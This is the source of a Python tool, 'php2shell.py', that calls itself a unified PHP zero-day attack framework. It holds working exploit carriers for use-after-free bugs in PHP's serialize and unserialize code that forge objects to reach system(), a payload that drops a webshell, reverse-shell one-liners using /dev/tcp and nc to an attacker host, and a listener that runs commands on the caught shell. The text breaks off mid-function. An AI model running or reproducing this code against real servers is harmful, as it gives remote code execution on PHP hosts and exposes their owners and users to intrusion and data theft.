#!/usr/bin/env python3
"""
php2shell.py — unified PHP 0-day attack framework (php2shell arsenal).

One weapon: point it at a target, it fingerprints, lists the viable chains
from the php2shell zero families, you pick, it fires and prints receipts.

TARGET MODES
  --target URL          remote HTTP target (recon: headers/cookies/probes)
  --local --php PATH    a PHP binary you possess (full-RCE chains)
  --docker NAME         a docker container running vanilla PHP (php:8.5-cli,
                        php:8.5.11-apache, wordpress:latest ...). The weapon
                        stages carriers via docker cp and fires via docker
                        exec under setarch -R (container must run with
                        --security-opt seccomp=unconfined for that).

CHAIN LIST (post-recon; each entry shows live viability for YOUR target)
  [sessgap]  session serialize_handler mismatch -> rfc1867 key injection ->
             app gadget destructor -> webshell -> detached revshell
             (zero1; fires on ANY PHP given the write/read divergence —
             receipted end-to-end incl. interactive shell)
  [zero4]    var_destroy re-entry UAF -> reclaim -> forged zval -> fake
             object -> get_debug_info=zif_system -> system()  (local/docker
             full RCE; plain `php -n` receipt, no debugger)
  [zero5]    serialize-side mirror UAF -> groom self-reclaim -> forged
             bucket zval -> dtor_obj=zif_system -> system()  (local/docker
             full RCE; plain `php -n` receipt)
  [uprog]    rfc1867 upload-progress UAF arms (CVE-2026-109618/19 fire
             shapes) — kill/crash manifests against unpatched victims
             (<= 8.5.12 without the Oct-2026 patch; Ubuntu jammy fleet)
  [cformat]  C: format internal-class crasher (zero7; crash/DoS receipt)
  [nativephp] NativePHP mobile bridge: upload -> File.Copy -> AsyncTask
             spool poison -> raw unserialize (POP/UAF, exfil, event forgery)
  [win-sess] Windows session O_NOFOLLOW=0 file-truncation lane (zero9;
             Windows victims only — listed NOT VIABLE elsewhere)

EXAMPLES
  # vanilla docker victim (the credibility run):
  docker run -d --name van85 --security-opt seccomp=unconfined php:8.5.11-apache
  python3 php2shell.py --docker van85
  python3 php2shell.py --docker van85 --chain zero5 --cmd 'id; uname -a'

  # distro fleet binary:
  python3 php2shell.py --local --php /usr/bin/php8.1 --chain zero4

  # remote session-gap chain with revshell:
  python3 php2shell.py --target http://127.0.0.1:8080 --chain sessgap \
      --gadget-class DeferredWriter --lhost 172.17.0.1 --lport 1361

HONESTY: every chain prints VIABLE/NOT + the reason. Remote chains that
need app-side premises (gadget class, endpoint shapes) say so; nothing
ships silent. Symbol extraction is runtime (ELF RELA scan) — no hardcoded
per-build offsets are required, though a verified table is included as a
fast path + canary cross-check.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

VERSION = "1.0.0"

# ============================================================================
# ELF tooling — zif_system via R_X86_64_RELATIVE relocation scan (works on
# stripped vanilla binaries; validated against dbgsym ground truths).
# ============================================================================

SHT_RELA = 4
SHT_PROGBITS = 1


def elf_parse(path):
    with open(path, "rb") as f:
        data = f.read()
    if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
        raise ValueError("not ELF64 LE")
    e_shoff = struct.unpack_from("<Q", data, 0x28)[0]
    e_shentsize = struct.unpack_from("<H", data, 0x3A)[0]
    e_shnum = struct.unpack_from("<H", data, 0x3C)[0]
    e_shstrndx = struct.unpack_from("<H", data, 0x3E)[0]
    sections = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        (sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size,
         _sh_link, _sh_info, _sh_align, _sh_entsize) = struct.unpack_from(
            "<IIQQQQIIQQ", data, off)
        sections.append({"name_off": sh_name, "type": sh_type, "flags": sh_flags,
                         "addr": sh_addr, "offset": sh_offset, "size": sh_size})
    shstr = sections[e_shstrndx]

    def secname(s):
        end = data.index(b"\x00", shstr["offset"] + s["name_off"])
        return data[shstr["offset"] + s["name_off"]:end].decode()

    for s in sections:
        s["name"] = secname(s)
    return data, sections


def _elf_strings(data, sections, needle):
    out = []
    for s in sections:
        if s["type"] != SHT_PROGBITS or not (s["flags"] & 0x2):  # SHF_ALLOC
            continue
        blob = data[s["offset"]:s["offset"] + s["size"]]
        start = 0
        while True:
            i = blob.find(needle, start)
            if i < 0:
                break
            out.append(s["addr"] + i)
            start = i + 1
    return out


def _rela_entries(data, sections):
    out = []
    for s in sections:
        if s["type"] != SHT_RELA:
            continue
        for i in range(s["size"] // 24):
            r_offset, r_info, r_addend = struct.unpack_from(
                "<QQq", data, s["offset"] + i * 24)
            if (r_info & 0xFFFFFFFF) == 8:  # R_X86_64_RELATIVE
                out.append((r_offset, r_addend))
    out.sort()
    return out


def _text_range(sections):
    for s in sections:
        if s["name"] == ".text":
            return s["addr"], s["addr"] + s["size"]
    return (0, 1 << 62)


def _handler_candidates(data, sections, relas, text, name):
    t0, t1 = text
    out = []
    for sv in _elf_strings(data, sections, name.encode() + b"\x00"):
        for idx, (_roff, addend) in enumerate(relas):
            if addend == sv:
                if idx + 1 < len(relas):
                    h = relas[idx + 1][1]
                    if t0 <= h < t1:
                        out.append(h)
                        break
    return out


def find_zif_system(path, verbose=False):
    """zif_system vaddr for any PIE PHP binary; canary = adjacent
    exec/passthru/shell_exec handlers from the same object file."""
    data, sections = elf_parse(path)
    text = _text_range(sections)
    relas = _rela_entries(data, sections)
    sys_c = _handler_candidates(data, sections, relas, text, "system")
    if not sys_c:
        return None, 0
    exe_c = _handler_candidates(data, sections, relas, text, "exec")
    pas_c = _handler_candidates(data, sections, relas, text, "passthru")
    she_c = _handler_candidates(data, sections, relas, text, "shell_exec")
    best, best_score = sys_c[0], 0
    for s in sys_c:
        score = ((1 if any(abs(s - e) <= 0x40 for e in exe_c) else 0)
                 + (1 if any(abs(s - p) <= 0x200 for p in pas_c) else 0)
                 + (1 if any(abs(s - h) <= 0x200 for h in she_c) else 0))
        if score > best_score:
            best, best_score = s, score
    if verbose:
        print(f"[*] ELF scan: zif_system=0x{best:x} (canary {best_score}/3, "
              f"{len(relas)} RELATIVE relocs)")
    return best, best_score


# ============================================================================
# Build tables: verified zif_system offsets (fast path; RELA scan is the
# general path and must agree or the table entry is ignored).
# ============================================================================

ZIF_TABLE = {
    # (version, build-class) -> offset      [receipt source]
    ("8.5.12", "plain2"): 0x523C60,    # php.net tarball, minimal cfg (sr2_m3)
    ("8.5.11", "out"): 0x4D9930,       # php.net tarball (vdR3)
    ("8.1.2", "cli"): 0x21A780,        # Ubuntu jammy dbgsym (vdR4 jammy)
}

# zend_object_handlers offsets (DWARF-verified): the var_dump trigger slot is
# get_debug_info (fires inside zend_std_get_properties_for); clone_obj_with
# was inserted at +24 in the 8.4+ structs.
HANDLER_OFFS = {
    "le83": {"gcn": 128, "gdi": 152, "end": 200},   # 8.1 / 8.2 / 8.3
    "ge84": {"gcn": 136, "gdi": 160, "end": 208},   # 8.4 / 8.5
}


def handler_class_for_version(version: str) -> str:
    try:
        parts = [int(x) for x in version.split(".")[:2]]
    except ValueError:
        return "ge84"
    return "le83" if tuple(parts) < (8, 4) else "ge84"


def version_tuple(v):
    try:
        return tuple(int(x) for x in v.split(".")[:3])
    except ValueError:
        return (0, 0, 0)


# ============================================================================
# Carriers (proven shapes — keep byte-identical except baked parameters)
# ============================================================================

ZERO5_CARRIER = r"""<?php
// zero5 carrier: serialize-side php_var_serialize_destroy re-entry UAF ->
// groom self-reclaim -> forged bucket zval -> fake zend_object ->
// handlers->dtor_obj = zif_system(fake execute_data) -> system().
$BASE = (int)($argv[1] ?? 0);
$ZIF  = (int)($argv[2] ?? 0);
$CMDTEXT = '__CMDTEXT__';

@unlink('__MARKER__');
file_put_contents('__CMDFILE__', "__CMD__\n");

class D {
    public function __destruct() {
        $GLOBALS['hits']++;
        $GLOBALS['pf'] = $GLOBALS['prefix'];
        $o = new stdClass;
        $a = [$o, new Groomer, $o];
        serialize($a);
        $GLOBALS['trace'] .= 'D';
    }
}
class Groomer {
    public function __sleep() {
        $GLOBALS['groom'] = str_pad($GLOBALS['pf'], 608, "\x00");
        return [];
    }
}
class P1 { public $d1; public $d2; }
class Carrier {
    public function __sleep() {
        $GLOBALS['p1']->d1 = null;
        $GLOBALS['p1']->d2 = null;
        $GLOBALS['trace'] .= 'S';
        return [];
    }
}

$V = function ($off) { global $BASE; return $BASE + 24 + $off; };
$OBJ   = $V(0);
$SMINI = $V(96);
$HT    = $V(152);
$CE    = $V(176);

$pre  = pack('VV', 1, 0x208);
$pre .= pack('VV', 0, 0);
$pre .= pack('P', $CE);
$pre .= pack('P', $HT);
$pre .= pack('P', 0);
$pre .= pack('P', 0x0000000100000000);
$pre .= str_repeat("\x00", 32);
$pre .= pack('PVV', $SMINI, 6, 0);
$pre .= pack('VV', 1, 0x1006);
$pre .= pack('P', 0);
$pre .= pack('P', strlen($CMDTEXT));
$pre .= $CMDTEXT . "\x00";
$pre .= str_repeat("\x00", 151 - 120 - strlen($CMDTEXT));
$pre .= pack('VV', 0, 0);
$pre .= pack('P', 0);
$pre .= pack('P', $ZIF);
$pre .= str_repeat("\x00", 232 - 176);
$pre .= pack('PVV', $OBJ, 0x108, 0);
$GLOBALS['prefix'] = $pre;

$GLOBALS['hits'] = 0; $GLOBALS['trace'] = '';
$GLOBALS['fs'] = [];
for ($i = 0; $i < 5; $i++) $GLOBALS['fs'][] = new stdClass;
$d = new D;
$GLOBALS['p1'] = new P1;
$GLOBALS['p1']->d1 = $d;
$GLOBALS['p1']->d2 = $d;
unset($d);
$arr = [$GLOBALS['p1']];
for ($i = 0; $i < 5; $i++) $arr[] = $GLOBALS['fs'][$i];
$arr[] = new Carrier;
$s = serialize($arr);
echo "hits={$GLOBALS['hits']} trace={$GLOBALS['trace']} len=" . strlen($s) . "\n";
echo "CALL-RETURNED\n";
if (is_file('__MARKER__')) {
    echo "MARKER-ON-DISK: " . trim(file_get_contents('__MARKER__')) . "\n";
}
echo "SURVIVED\n";
file_put_contents('__MAPS__', file_get_contents('/proc/self/maps'));
"""

ZERO4_CARRIER = r"""<?php
// zero4 carrier (prebuilt pattern): var_destroy re-entry UAF -> reclaim ->
// forged zval* -> fake object -> handlers->get_debug_info = zif_system.
// Pattern is built at TOP LEVEL so the destructor's only allocation is the
// groom str_repeat (reclaim receipted on minimal 8.5.12 + jammy 8.1.2).
$CHUNK = (int)($argv[1] ?? 0);
$BASE  = (int)($argv[2] ?? 0);
$ZIF_SYSTEM = $BASE + __ZIFOFF__;
$CMDTEXT = '__CMDTEXT__';

@unlink('__MARKER__');
file_put_contents('__CMDFILE__', "__CMD__\n");

class D {
    public function __destruct() {
        $GLOBALS['groom'] = str_repeat($GLOBALS['pat'], 4);
        $r1 = @unserialize('R:1020;');
        echo "TRIGGERING var_dump(\$r1) -> handlers->get_debug_info(obj)=zif_system(fake_execute_data)\n";
        var_dump($r1);
        echo "SURVIVED-CALL\n";
    }
}

$V = function ($off) { global $CHUNK; return $CHUNK + 24 + $off; };
$OBJ = $V(32); $HT = $V(600); $CE = $V(1600); $SMINI = $V(128);
$pat  = pack('P', $V(16));
$pat .= str_repeat("\x00", 8);
$pat .= pack('PVV', $OBJ, 8, 0);
$pat .= pack('VV', 1, 8);
$pat .= pack('VV', 0x1337, 0);
$pat .= pack('P', $CE);
$pat .= pack('P', $HT);
$pat .= pack('P', 0);
$pat .= pack('P', 0x0000000100000000);
$pat .= str_repeat("\x00", 32);
$pat .= pack('PVV', $SMINI, 6, 0);
$pat .= pack('VV', 1, 0x16);
$pat .= pack('P', 0);
$pat .= pack('P', strlen($CMDTEXT));
$pat .= $CMDTEXT . "\x00";
$pat .= str_repeat("\x00", 599 - 152 - strlen($CMDTEXT));
$h  = pack('VV', 0, 0);
$h .= pack('P', 0);
$h .= pack('P', $ZIF_SYSTEM);
$h .= str_repeat("\x00", __GCN__ - 24);
$h .= pack('P', $ZIF_SYSTEM);
$h .= str_repeat("\x00", __GDI__ - __GCN__ - 8);
$h .= pack('P', $ZIF_SYSTEM);
$h .= str_repeat("\x00", __END__ - __GDI__ - 8);
$pat .= $h;
$pat .= str_repeat("\x00", 1600 - 808);
$pat .= str_repeat("\x00", 2040 - 1600);
$GLOBALS['pat'] = $pat;
echo "forged: OBJ=0x", dechex($OBJ), " HT=0x", dechex($HT),
     " zif_system=0x", dechex($ZIF_SYSTEM), " patlen=", strlen($pat), "\n";

$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = 'i:9998;O:1:"D":0:{}';
$els[] = 'i:9998;i:5;';
$payload = 'a:1020:{' . implode('', $els) . '}';
$r = unserialize($payload);
echo "outer ok=";
var_dump($r !== false);
echo "SCRIPT-END\n";
file_put_contents('__MAPS__', file_get_contents('/proc/self/maps'));
"""

# Remote unserialize-side trigger (vd1b class) for delivery to endpoints.
def build_trigger(gadget_class: str, marker: bool = False) -> str:
    els = [f"i:{k};i:1;" for k in range(1018)]
    if marker:
        prop = "0" * 64
        els.append(f'i:9998;O:{len(gadget_class)}:"{gadget_class}":1:{{'
                   f's:4:"addr";s:{len(prop)}:"{prop}";}}')
    else:
        els.append(f'i:9998;O:{len(gadget_class)}:"{gadget_class}":0:{{}}')
    els.append("i:9998;i:5;")
    return "a:1020:{" + "".join(els) + "}"


def serialize_str(s: str) -> str:
    return f's:{len(s)}:"{s}"'


def build_gadget_injection(gadget_class: str, props: dict) -> str:
    """'inj|' + hand-built serialize() of a gadget object with given props
    (no PHP needed on the attacker side). Format per pair: name;value;"""
    body = "".join(serialize_str(k) + ";" + serialize_str(v) + ";"
                   for k, v in props.items())
    return f"inj|O:{len(gadget_class)}:\"{gadget_class}\":{len(props)}:{{{body}}}"


WEBSHELL = "<?php @system($_GET['c']); ?>"

REVSH_BASH = ("setsid bash -c 'exec 2>&1; exec 3<>/dev/tcp/{lh}/{lp}; "
              "while IFS= read -r l <&3; do o=$(eval \"$l\" 2>&1); "
              "printf \"%s\\n\" \"$o\" >&3; done' >/dev/null 2>&1 </dev/null &")
REVSH_NC = ("setsid sh -c 'rm -f /tmp/.p2s_f;mkfifo /tmp/.p2s_f;"
            "(cat /tmp/.p2s_f|bash -i 2>&1;echo SHELL-EOF)|nc {lh} {lp} "
            ">/tmp/.p2s_f' >/dev/null 2>&1 </dev/null &")

# ============================================================================
# Runners: Local (setarch) and Docker (docker exec + cp staging)
# ============================================================================

class LocalRunner:
    kind = "local"

    def __init__(self, php_path, verbose=False):
        self.php = os.path.realpath(php_path)
        if not os.path.isfile(self.php):
            raise FileNotFoundError(self.php)
        self.setarch = shutil.which("setarch")
        self.verbose = verbose

    def php_version(self):
        out = subprocess.run([self.php, "-v"], capture_output=True,
                             text=True, timeout=60)
        m = re.search(r"PHP (\d+\.\d+\.\d+)", out.stdout + out.stderr)
        return m.group(1) if m else "?"

    def php_info_grep(self, pat):
        out = subprocess.run([self.php, "-n", "-i"], capture_output=True,
                             text=True, timeout=120)
        return [ln for ln in (out.stdout + out.stderr).splitlines()
                if pat in ln]

    def _cmd(self, argv, cwd=None):
        cmd = ([self.setarch, "x86_64", "-R"] if self.setarch else []) + argv
        try:
            p = subprocess.run(cmd, capture_output=True, timeout=90, cwd=cwd)
            p.stdout = p.stdout.decode("utf-8", "replace")
            p.stderr = p.stderr.decode("utf-8", "replace")
            return p
        except subprocess.TimeoutExpired as e:
            class TO:
                returncode = -999
                stdout = (e.stdout or b"").decode("utf-8", "replace") \
                    if isinstance(e.stdout, bytes) else (e.stdout or "")
                stderr = "TIMEOUT"
            return TO()

    def probe_maps(self):
        code = "echo file_get_contents('/proc/self/maps');"
        p = self._cmd([self.php, "-n", "-r", code])
        return parse_maps(p.stdout)

    def run_carrier(self, cwd, script, arg1, arg2):
        p = self._cmd([self.php, "-n", script, f"{arg1:016d}", f"{arg2:016d}"],
                      cwd=cwd)
        return p.returncode, p.stdout + p.stderr

    def read_file(self, path):
        try:
            with open(path) as f:
                return f.read()
        except OSError:
            return None

    def unlink(self, path):
        try:
            os.unlink(path)
        except OSError:
            pass

    def write_file(self, path, content):
        with open(path, "w") as f:
            f.write(content)

    def sym_extract(self):
        """zif_system via nm/readelf, else the RELA scan."""
        for tool in (["nm"], ["readelf", "--syms", "--wide"]):
            try:
                p = subprocess.run(tool + [self.php], capture_output=True,
                                   text=True, timeout=120)
            except FileNotFoundError:
                continue
            for line in p.stdout.splitlines():
                parts = line.split()
                if parts and parts[-1] == "zif_system":
                    for tok in parts[:-1]:
                        if len(tok) >= 6 and re.fullmatch(r"[0-9a-fA-F]+", tok):
                            return int(tok, 16), "symtab"
        off, score = find_zif_system(self.php, verbose=self.verbose)
        return off, f"rela-scan(canary {score}/3)" if off else None


class DockerRunner:
    kind = "docker"

    def __init__(self, container, php_path="/usr/local/bin/php", verbose=False):
        self.container = container
        self.php = php_path
        self.verbose = verbose
        r = subprocess.run(["docker", "inspect", "-f", "{{.State.Running}}",
                            container], capture_output=True, text=True)
        if r.returncode != 0 or r.stdout.strip() != "true":
            raise RuntimeError(
                f"container {container} not running (docker run -d --name "
                f"{container} --security-opt seccomp=unconfined <image>; "
                "seccomp=unconfined is REQUIRED for setarch -R inside)")

    def _exec(self, argv, timeout=90, cwd=None):
        cmd = ["docker", "exec"] + (["-w", cwd] if cwd else []) \
            + [self.container] + argv
        try:
            p = subprocess.run(cmd, capture_output=True, timeout=timeout)
            p.stdout = p.stdout.decode("utf-8", "replace")
            p.stderr = p.stderr.decode("utf-8", "replace")
            return p
        except subprocess.TimeoutExpired as e:
            class TO:
                returncode = -999
                stdout = (e.stdout or b"").decode("utf-8", "replace") \
                    if isinstance(e.stdout, bytes) else (e.stdout or "")
                stderr = "TIMEOUT"
            return TO()

    def php_version(self):
        p = self._exec([self.php, "-v"])
        m = re.search(r"PHP (\d+\.\d+\.\d+)", p.stdout + p.stderr)
        return m.group(1) if m else "?"

    def php_info_grep(self, pat):
        p = self._exec([self.php, "-n", "-i"], timeout=180)
        return [ln for ln in (p.stdout + p.stderr).splitlines() if pat in ln]

    def _cmd(self, argv, cwd=None):
        return self._exec(["setarch", "x86_64", "-R"] + argv, cwd=cwd)

    def probe_maps(self):
        code = "echo file_get_contents('/proc/self/maps');"
        p = self._cmd([self.php, "-n", "-r", code])
        return parse_maps(p.stdout)

    def run_carrier(self, cwd, script, arg1, arg2):
        p = self._cmd([self.php, "-n", script, f"{arg1:016d}", f"{arg2:016d}"],
                      cwd=cwd)
        return p.returncode, p.stdout + p.stderr

    def exec_cwd(self, cwd, argv):
        return self._exec(argv, cwd=cwd)

    def read_file(self, path):
        p = self._exec(["cat", path])
        return p.stdout if p.returncode == 0 else None

    def unlink(self, path):
        self._exec(["rm", "-f", path])

    def write_file(self, path, content):
        # stage through docker cp (content-safety: no shell interpolation)
        tmp = tempfile.mktemp(prefix="p2s_stage_", suffix=".php")
        with open(tmp, "w", newline="\n") as f:
            f.write(content)
        d = os.path.dirname(path)
        if d:
            self._exec(["mkdir", "-p", d])
        subprocess.run(["docker", "cp", tmp, f"{self.container}:{path}"],
                       capture_output=True, timeout=60)
        os.unlink(tmp)

    def sym_extract(self):
        # pull the binary once and scan it host-side
        tmp = tempfile.mktemp(prefix="p2s_phpbin_")
        try:
            r = subprocess.run(["docker", "cp",
                                f"{self.container}:{self.php}", tmp],
                               capture_output=True, timeout=180)
            if r.returncode != 0:
                return None, "docker cp failed"
            off, score = find_zif_system(tmp, verbose=self.verbose)
            return off, (f"rela-scan(canary {score}/3)" if off else "not found")
        finally:
            try:
                os.unlink(tmp)
            except OSError:
                pass


def parse_maps(maps_text):
    """binary base + ZendMM chunk candidates from /proc/self/maps."""
    bin_base = None
    chunks = []
    for line in maps_text.splitlines():
        parts = line.split(None, 5)
        if len(parts) < 2:
            continue
        span, perms = parts[0], parts[1]
        path = parts[5].strip() if len(parts) > 5 else ""
        try:
            start, end = (int(x, 16) for x in span.split("-"))
        except ValueError:
            continue
        if "php" in os.path.basename(path) and (bin_base is None or start < bin_base):
            bin_base = start
        if "zend_alloc" in path:
            chunks.append((start, end - start))
    if not chunks:
        for line in maps_text.splitlines():
            parts = line.split(None, 5)
            if len(parts) < 2:
                continue
            span, perms = parts[0], parts[1]
            path = parts[5].strip() if len(parts) > 5 else ""
            try:
                start, end = (int(x, 16) for x in span.split("-"))
            except ValueError:
                continue
            if path == "" and "r" in perms and "w" in perms and end - start >= 0x100000:
                chunks.append((start, end - start))
    return {"bin_base": bin_base, "chunks": chunks, "raw": maps_text}


# ============================================================================
# Sweep engine (exploit-as-oracle; adaptive chunk discovery)
# ============================================================================

SR2_WINDOW = (0x78000, 0x8A000)     # zero5: 640B old-arData block (8.5.x)
VDR_WINDOW = (0x90000, 0xD0000)     # zero4: 8160B entries block (receipted)


def sweep_chain(runner, workdir, script, window, arg2, marker, maps_path,
                label, verbose, max_tries):
    """Fire the carrier at candidate block addresses until the marker lands.
    Chunk set grows adaptively: every fired run dumps its own /proc/self/maps
    at script end (vanilla binaries allocate many chunks)."""
    disc = runner.probe_maps()
    chunks = [c for c, _ in disc["chunks"]] or []
    if not chunks:
        return False, None, "no ZendMM chunks in maps probe", disc

    def read_back_chunks():
        maps = runner.read_file(maps_path)
        if not maps:
            return
        for c, _ in parse_maps(maps)["chunks"]:
            if c not in chunks:
                chunks.append(c)

    tried = set()
    n = 0
    # round 1: receipted window per chunk; round 2: full 2MB per chunk
    for rnd, (lo, hi) in enumerate(((window[0], window[1]), (0x0, 0x1FF000))):
        for chunk in list(chunks):
            for off in range(lo, hi + 1, 0x1000):
                base = chunk + off
                if base in tried:
                    continue
                tried.add(base)
                n += 1
                if n > max_tries:
                    return False, None, f"sweep exhausted ({n})", disc
                runner.unlink(marker)
                rc, out = runner.run_carrier(workdir, script, base, arg2)
                hit = runner.read_file(marker)
                if hit is not None and hit.strip():
                    return True, base, out, disc
                if n % 25 == 0 and verbose:
                    print(f"    [{label}] #{n} chunk=0x{chunk:x} "
                          f"base=0x{base:x} rc={rc}")
                if n % 10 == 0:
                    read_back_chunks()  # adaptive: new chunks join the sweep
    return False, None, "window exhausted without marker", disc


def render_carrier(tpl, *, marker, cmdfile, cmd, cmdtext, zif_off=None,
                   version=None, maps_path="/tmp/.p2s_maps"):
    s = tpl.replace("__MARKER__", marker)
    s = s.replace("__CMDFILE__", cmdfile)
    s = s.replace("__CMD__", f"({cmd}) > {marker} 2>&1")
    s = s.replace("__CMDTEXT__", cmdtext)
    s = s.replace("__MAPS__", maps_path)
    if zif_off is not None:
        s = s.replace("__ZIFOFF__", str(zif_off))
    if version is not None:
        h = HANDLER_OFFS[handler_class_for_version(version)]
        s = s.replace("__GCN__", str(h["gcn"]))
        s = s.replace("__GDI__", str(h["gdi"]))
        s = s.replace("__END__", str(h["end"]))
    return s


# ============================================================================
# HTTP helpers + listener (hardened: no bare nc — playbook item 4)
# ============================================================================

def http_req(url, data=None, headers=None, method=None, timeout=30):
    req = urllib.request.Request(url, data=data, headers=headers or {},
                                 method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(), dict(r.headers), time.time() - t0
    except urllib.error.HTTPError as e:
        return e.code, (e.read() or b""), dict(e.headers), time.time() - t0
    except Exception as e:
        return None, f"{type(e).__name__}: {e}".encode(), {}, time.time() - t0


def multipart_body(fields, files, boundary=b"P2Sbound2026"):
    out = b""
    for name, val in fields:
        out += (b"--" + boundary +
                b"\r\nContent-Disposition: form-data; name=\"" +
                name.encode() + b"\"\r\n\r\n" + val.encode() + b"\r\n")
    for name, fn, content in files:
        out += (b"--" + boundary +
                b"\r\nContent-Disposition: form-data; name=\"" + name.encode() +
                b"\"; filename=\"" + fn.encode() + b"\"\r\n\r\n" +
                content + b"\r\n")
    out += b"--" + boundary + b"--\r\n"
    return out


def raw_post(host, port, path, headers, body, timeout=20):
    """Raw socket POST (needed for the slow/abort upload variants)."""
    s = socket.create_connection((host, port), timeout=timeout)
    hdr = (f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
           + "".join(f"{k}: {v}\r\n" for k, v in headers.items())
           + f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n")
    s.sendall(hdr.encode() + body)
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    finally:
        s.close()
    first = data.split(b"\r\n", 1)[0].decode("utf-8", "replace")
    code = first.split(" ")[1] if " " in first else "NOHTTP"
    return code, data


class Listener(threading.Thread):
    """Receipt listener: accepts one connection, runs a command script,
    captures output (the revshell receipt)."""
    def __init__(self, lhost, lport, log_path, commands=None):
        super().__init__(daemon=True)
        self.lport = lport
        self.log_path = log_path
        self.commands = commands or ["id", "whoami", "php -v | head -1",
                                     "uname -r"]
        self.log = open(log_path, "wb", 0)
        self.sock = None
        self.got = threading.Event()

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", self.lport))
        s.listen(1)
        s.settimeout(180)
        self.sock = s
        self.log.write(f"[*] listener on :{self.lport}\n".encode())
        try:
            conn, addr = s.accept()
        except socket.timeout:
            self.log.write(b"[-] no connection\n")
            return
        self.log.write(f"[+] CONNECTION FROM {addr[0]}:{addr[1]}\n".encode())
        self.got.set()
        conn.settimeout(3)
        time.sleep(0.5)
        for cmd in self.commands:
            try:
                conn.sendall((cmd + "\n").encode())
            except OSError:
                break
            time.sleep(1.2)
            try:
                while True:
                    d = conn.recv(4096)
                    if not d:
                        break
                    self.log.write(d)
            except socket.timeout:
                pass
            except OSError:
                break
        self.log.write(b"\n[*] session captured\n")
        conn.close()


# ============================================================================
# Recon
# ============================================================================

def recon_local(runner, args):
    ver = runner.php_version()
    r = {"version": ver, "kind": runner.kind}
    print(f"[*] PHP {ver} ({runner.kind}:{runner.php})")
    sapi = runner.php_info_grep("Server API =>")
    if sapi:
        print(f"[*] {sapi[0].strip()}")
        r["sapi"] = sapi[0].split("=>")[-1].strip()
    exts = runner.php_info_grep("session.serialize_handler =>")
    if exts:
        print(f"[*] {exts[0].strip()}")
    up = runner.php_info_grep("session.upload_progress.enabled =>")
    if up:
        print(f"[*] {up[0].strip()}")
    # symbols
    off, src = runner.sym_extract()
    if off is None:
        vt = version_tuple(ver)
        for (v, cls), o in ZIF_TABLE.items():
            if v == ver:
                off, src = o, "table"
    r["zif_offset"], r["zif_src"] = off, src
    if off is None:
        print("[-] zif_system not extractable (no symtab, RELA scan failed)")
    else:
        print(f"[+] zif_system = +0x{off:x} ({src})")
    disc = runner.probe_maps()
    r["bin_base"] = disc["bin_base"]
    r["chunks"] = [hex(c) for c, _ in disc["chunks"]]
    print(f"[*] binary base {hex(disc['bin_base']) if disc['bin_base'] else '?'}"
          f"  ZendMM chunks: {', '.join(r['chunks'][:6]) or 'none (ASLR on?)'}")
    if runner.kind == "local" and not getattr(runner, "setarch", None):
        print("[!] setarch missing — ASLR stays on, address-sweep chains dead")
        r["setarch"] = False
    else:
        r["setarch"] = True
    return r


def recon_remote(target):
    r = {"target": target}
    st, body, hdrs, dt = http_req(target)
    r["status"], r["headers"] = st, hdrs
    phpv = hdrs.get("X-Powered-By", "")
    if phpv:
        print(f"[+] X-Powered-By: {phpv}")
        m = re.search(r"PHP/(\d+\.\d+\.\d+)", phpv)
        if m:
            r["version"] = m.group(1)
    cookie = hdrs.get("Set-Cookie", "")
    if cookie:
        print(f"[+] Set-Cookie: {cookie[:100]}")
        r["cookie"] = cookie
    body_s = body[:4000].decode("utf-8", "replace")
    for pat, name in ((r"PHP (\d+\.\d+\.\d+)", "body version string"),):
        m = re.search(pat, body_s)
        if m and "version" not in r:
            r["version"] = m.group(1)
            print(f"[+] {name}: {m.group(1)}")
    # upload_progress multipart probe (does the endpoint parse multipart)
    probe = multipart_body([("PHP_SESSION_UPLOAD_PROGRESS", "p2sprobe")],
                           [("f", "x.txt", b"probe-bytes")])
    st2, body2, hdrs2, dt2 = http_req(
        target, data=probe, headers={
            "Content-Type": "multipart/form-data; boundary=P2Sbound2026"})
    r["multipart_probe"] = {"status": st2, "dt": dt2}
    print(f"[*] multipart probe: {st2} ({dt2:.2f}s)")
    r.setdefault("version", None)
    if r["version"]:
        print(f"[*] fingerprinted: PHP {r['version']}")
    else:
        print("[*] version not in headers — chains keyed on version show "
              "UNKNOWN (pass --version to override)")
    return r


# ============================================================================
# Chain implementations
# ============================================================================

def fire_local_chain(runner, recon, args, chain_key):
    """zero4/zero5 local+docker full-RCE: render, sweep, receipt."""
    ver = args.version or recon["version"]
    zif_off = recon.get("zif_offset")
    if zif_off is None:
        print("[-] no zif_system offset — cannot forge the call")
        return 1
    disc = runner.probe_maps()
    bin_base = disc["bin_base"]
    if bin_base is None:
        print("[-] no binary base in maps probe")
        return 1
    zif_addr = bin_base + zif_off
    vt = version_tuple(ver)
    print(f"[*] {chain_key}: PHP {ver} base 0x{bin_base:x} "
          f"zif_system 0x{zif_addr:x}")

    workdir = "/tmp/w"
    if runner.kind == "docker":
        runner._exec(["mkdir", "-p", workdir])
    else:
        os.makedirs(workdir, exist_ok=True)
    marker = "/tmp/.p2s_pwn"
    cmdfile = "/tmp/.p2s_cmd"
    cmd = args.cmd or "id"
    maps_path = "/tmp/.p2s_maps"

    if chain_key == "zero5":
        cmdtext = "sh " + cmdfile
        script = "sr2_call.php"
        tpl = ZERO5_CARRIER
        window = SR2_WINDOW
        arg2 = zif_addr
    else:
        cmdtext = "sh " + cmdfile
        script = "vdR4_call.php"
        tpl = ZERO4_CARRIER
        window = VDR_WINDOW
        arg2 = bin_base

    carrier = render_carrier(tpl, marker=marker, cmdfile=cmdfile, cmd=cmd,
                             cmdtext=cmdtext, zif_off=zif_off, version=ver,
                             maps_path=maps_path)
    runner.write_file(os.path.join(workdir, script), carrier)
    print(f"[*] staged {workdir}/{script}; exploit-as-oracle sweep "
